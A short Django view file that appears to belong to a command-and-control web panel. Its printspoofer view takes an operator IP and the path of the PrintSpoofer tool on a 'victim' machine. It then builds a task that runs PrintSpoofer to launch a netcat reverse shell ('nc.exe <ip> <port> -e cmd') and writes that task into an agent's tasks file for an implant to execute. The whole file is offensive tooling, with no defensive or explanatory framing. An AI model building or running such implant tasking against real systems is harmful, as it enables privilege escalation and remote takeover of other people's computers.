import os
from blog.views import *
from blog.models import *
from rest_framework.views import APIView
from django.http import HttpResponse
current_path= os.path.dirname(os.path.abspath(__file__))

#we need to send request from GUI user with agent(hidden parm) and path(opt)
def printspoofer (request,agent='',myip='',pathOfSpooferOnVictim='',listenport=''):
    if request.method=='POST':
        myip = request.POST['myip']
        pathOfSpooferOnVictim = request.POST['pathOfSpooferOnVictim']
        task = '{} -c "c:\tools\nc.exe {} {} -e cmd"'.format(pathOfSpooferOnVictim,myip,listenport)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return render(request, 'blog/payload-Gen.html' )
    else:
        return render(request, 'blog/listeners.html')
    
    # ls c:\users


